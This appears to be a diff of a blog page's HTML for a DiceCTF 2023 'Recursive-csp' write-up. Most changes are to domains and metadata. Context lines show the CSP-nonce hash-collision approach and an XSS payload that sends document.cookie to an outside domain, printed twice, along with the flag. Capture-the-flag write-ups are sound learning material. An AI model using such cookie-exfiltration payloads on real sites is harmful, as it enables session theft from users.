@@ -5,29 +5,32 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
-    <title>Recursive-csp - DiceCTF 2023 - My Blog</title><meta name="Description" content="Don&#39;t book a cover by it&#39;s judge"><meta property="og:title" content="Recursive-csp - DiceCTF 2023" />
-<meta property="og:description" content="
-    tl;dr
-Craft a payload with a random nonce
-Use something like hash-collider to collide the nonce we gave earlier
-" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="http://r0h1t.me/blog/posts/rescursive-csp/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2023-02-08T00:00:00+05:30" />
-<meta property="article:modified_time" content="2023-02-08T00:00:00+05:30" />
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Recursive-csp - DiceCTF 2023"/>
-<meta name="twitter:description" content="
-    tl;dr
-Craft a payload with a random nonce
-Use something like hash-collider to collide the nonce we gave earlier
-"/>
+    <title>Recursive-csp - DiceCTF 2023 - My Blog</title><meta name="Description" content="Don&#39;t book a cover by it&#39;s judge"><meta property="og:url" content="http://lu513n.com/blog/posts/rescursive-csp/">
+  <meta property="og:site_name" content="My Blog">
+  <meta property="og:title" content="Recursive-csp - DiceCTF 2023">
+  <meta property="og:description" content=" tl;dr Craft a payload with a random nonce Use something like hash-collider to collide the nonce we gave earlier ">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-02-08T00:00:00+05:30">
+    <meta property="article:modified_time" content="2023-02-08T00:00:00+05:30">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Csp">
+    <meta property="article:tag" content="Dicectf23-Writeups">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Nonce">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Recursive-csp - DiceCTF 2023">
+  <meta name="twitter:description" content=" tl;dr Craft a payload with a random nonce Use something like hash-collider to collide the nonce we gave earlier ">
+      <meta name="twitter:site" content="@Lu513n">
 <meta name="application-name" content="My Blog">
 <meta name="apple-mobile-web-app-title" content="My Blog">
 
 <meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://r0h1t.me/blog/posts/rescursive-csp/" /><link rel="next" href="http://r0h1t.me/blog/posts/jnotes/" /><link rel="stylesheet" href="/blog/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/blog/css/color.css"><link rel="stylesheet" href="/blog/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/blog/lib/fontawesome-free/all.min.css">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://lu513n.com/blog/posts/rescursive-csp/" /><link rel="prev" href="http://lu513n.com/blog/posts/codebox/files/box/" /><link rel="next" href="http://lu513n.com/blog/posts/jnotes/" /><link rel="stylesheet" href="/blog/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/blog/css/color.css"><link rel="stylesheet" href="/blog/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/blog/lib/fontawesome-free/all.min.css">
         <noscript><link rel="stylesheet" href="/blog/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/blog/lib/animate/animate.min.css">
         <noscript><link rel="stylesheet" href="/blog/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
@@ -37,9 +40,9 @@ Use something like hash-collider to collide the nonce we gave earlier
         "inLanguage": "en",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "http:\/\/r0h1t.me\/blog\/posts\/rescursive-csp\/"
+            "@id": "http:\/\/lu513n.com\/blog\/posts\/rescursive-csp\/"
         },"genre": "posts","keywords": "web, csp, dicectf23-writeups, ctf, writeup, nonce, hash-collision","wordcount":  536 ,
-        "url": "http:\/\/r0h1t.me\/blog\/posts\/rescursive-csp\/","datePublished": "2023-02-08T00:00:00+05:30","dateModified": "2023-02-08T00:00:00+05:30","publisher": {
+        "url": "http:\/\/lu513n.com\/blog\/posts\/rescursive-csp\/","datePublished": "2023-02-08T00:00:00+05:30","dateModified": "2023-02-08T00:00:00+05:30","publisher": {
             "@type": "Organization",
             "name": "Rohit"},"authors": [{
                         "@type": "Person",
@@ -58,16 +61,7 @@ Use something like hash-collider to collide the nonce we gave earlier
         getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
     </script>
     <div id="back-to-top"></div>
-    <div id="mask"></div><div class="wrapper">
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-L6TEV86QF7"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-L6TEV86QF7');
-</script>
-<header class="desktop" id="header-desktop">
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
         <div class="header-title">
             <a href="/blog/" title="My Blog">My Blog</a>
@@ -129,8 +123,8 @@ Use something like hash-collider to collide the nonce we gave earlier
 <main class="main">
             <div class="container"><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Recursive-csp - DiceCTF 2023</h1><div class="post-meta">
             <div class="post-meta-line">
-                <span class="post-author"><span class='author'><i class="author fas fa-user-circle fa-fw"></i><span class='screen-reader-text'>  </span><a href='http://r0h1t.me/blog/authors/rohit'>Rohit</a></span>
-                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/blog/categories/dicectf23-writeups/"><i class="far fa-folder fa-fw"></i>dicectf23-writeups</a>&nbsp;<a href="/blog/categories/all-writeups/"><i class="far fa-folder fa-fw"></i>All Writeups</a></span></div>
+                <span class="post-author"><span class='author'><i class="author fas fa-user-circle fa-fw"></i><span class='screen-reader-text'>  </span><a href='http://lu513n.com/blog/authors/rohit'>Rohit</a></span>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/blog/categories/dicectf23-writeups/"><i class="far fa-folder fa-fw"></i>Dicectf23-Writeups</a>&nbsp;<a href="/blog/categories/all-writeups/"><i class="far fa-folder fa-fw"></i>All Writeups</a></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-02-08">2023-02-08</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-02-08">2023-02-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;536 words&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;<span id="/blog/posts/rescursive-csp/" class="leancloud_visitors" data-flag-title="Recursive-csp - DiceCTF 2023">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class="leancloud-visitors-count waline-pageview-count" data-path="/blog/posts/rescursive-csp/"></span>&nbsp;views
@@ -200,7 +194,7 @@ Use something like hash-collider to collide the nonce we gave earlier
 </span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><p>But this never worked out 😢</p>
+</span></span></span></code></pre></div><p>But this never worked out &#x1f622;</p>
 <p>We tried this so for so long and while it was running we searched for other ways.</p>
 <h3 id="trying-the-collider" class="headerLink">
     <a href="#trying-the-collider" class="header-mark"></a>Trying the collider</h3><p>So we searched for <code>crc32</code> collissions and got <a href="https://github.com/fyxme/crc-32-hash-collider" target="_blank" rel="noopener noreferrer">this</a></p>
@@ -230,7 +224,7 @@ Use something like hash-collider to collide the nonce we gave earlier
 <p><strong>Note: Here we had to use a domain as the payload can only contain 127 characters and if we use webhook url we won&rsquo;t have enough charcters left to bruteforce</strong></p>
 <p>By running the code on 16 different laptops with 16 cores with 16 different nonces, we were able to collide it just in time.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#34;e6377dcb&#34;</span><span class="p">&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s2">&#34;http://asol.space?x=&#34;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>000000000000000000000000000000000048io
-</span></span></code></pre></div><p>But we made one mistake in the domain to which the flag is sent. Where the domain was supposed to be <code>https://axol.space</code> I put <code>https://asol.space</code> 😭</p>
+</span></span></code></pre></div><p>But we made one mistake in the domain to which the flag is sent. Where the domain was supposed to be <code>https://axol.space</code> I put <code>https://asol.space</code> &#x1f62d;</p>
 <p>Now we had to put the correct domain and hash it again. This time it took even longer. It took so much time that we were just going to buy <code>https://asol.space</code>. But we collided that payload too and finally got the flag</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#34;e6377dcb&#34;</span><span class="p">&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s2">&#34;http://asol.space?x=&#34;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>0000000000hytza
 </span></span></code></pre></div><p><strong>Flag</strong>: <code>dice{h0pe_that_d1dnt_take_too_l0ng}</code></p></div>
@@ -246,26 +240,26 @@ Use something like hash-collider to collide the nonce we gave earlier
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="#" title="Share on Twitter" data-sharer="twitter" data-url="http://r0h1t.me/blog/posts/rescursive-csp/" data-title="Recursive-csp - DiceCTF 2023" data-via="Lu513n" data-hashtags="web,csp,dicectf23-writeups,ctf,writeup,nonce,hash-collision"><i class="fab fa-twitter fa-fw"></i></a><a href="#" title="Share on Facebook" data-sharer="facebook" data-url="http://r0h1t.me/blog/posts/rescursive-csp/" data-hashtag="web"><i class="fab fa-facebook-square fa-fw"></i></a><a href="#" title="Share on Linkedin" data-sharer="linkedin" data-url="http://r0h1t.me/blog/posts/rescursive-csp/"><i class="fab fa-linkedin fa-fw"></i></a><a href="#" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://r0h1t.me/blog/posts/rescursive-csp/" data-title="Recursive-csp - DiceCTF 2023" data-web><i class="fab fa-whatsapp fa-fw"></i></a></span>
+                <span><a href="#" title="Share on Twitter" data-sharer="twitter" data-url="http://lu513n.com/blog/posts/rescursive-csp/" data-title="Recursive-csp - DiceCTF 2023" data-via="Lu513n" data-hashtags="web,csp,dicectf23-writeups,ctf,writeup,nonce,hash-collision"><i class="fab fa-twitter fa-fw"></i></a><a href="#" title="Share on Facebook" data-sharer="facebook" data-url="http://lu513n.com/blog/posts/rescursive-csp/" data-hashtag="web"><i class="fab fa-facebook-square fa-fw"></i></a><a href="#" title="Share on Linkedin" data-sharer="linkedin" data-url="http://lu513n.com/blog/posts/rescursive-csp/"><i class="fab fa-linkedin fa-fw"></i></a><a href="#" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://lu513n.com/blog/posts/rescursive-csp/" data-title="Recursive-csp - DiceCTF 2023" data-web><i class="fab fa-whatsapp fa-fw"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/blog/tags/web/">web</a>,&nbsp;<a href="/blog/tags/csp/">csp</a>,&nbsp;<a href="/blog/tags/dicectf23-writeups/">dicectf23-writeups</a>,&nbsp;<a href="/blog/tags/ctf/">ctf</a>,&nbsp;<a href="/blog/tags/writeup/">writeup</a>,&nbsp;<a href="/blog/tags/nonce/">nonce</a>,&nbsp;<a href="/blog/tags/hash-collision/">hash-collision</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/blog/tags/web/">Web</a>,&nbsp;<a href="/blog/tags/csp/">Csp</a>,&nbsp;<a href="/blog/tags/dicectf23-writeups/">Dicectf23-Writeups</a>,&nbsp;<a href="/blog/tags/ctf/">Ctf</a>,&nbsp;<a href="/blog/tags/writeup/">Writeup</a>,&nbsp;<a href="/blog/tags/nonce/">Nonce</a>,&nbsp;<a href="/blog/tags/hash-collision/">Hash-Collision</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/blog/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav">
+    <div class="post-nav"><a href="/blog/posts/codebox/files/box/" class="prev" rel="prev" title=""><i class="fas fa-angle-left fa-fw"></i></a>
             <a href="/blog/posts/jnotes/" class="next" rel="next" title="Jnotes - DiceCTF 2023">Jnotes - DiceCTF 2023<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 <div id="comments"><div id="waline" class="comment"></div><noscript>
                 Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/">Waline</a>.
             </noscript></div></article></div>
         </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://r0h1t.me/" target="_blank" rel="noopener noreferrer">Rohit</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://r0h1t.me/" target="_blank" rel="noopener noreferrer">Rohit</a></span></div>
             <div class="footer-line"></div>
             <div class="footer-line">
             </div>
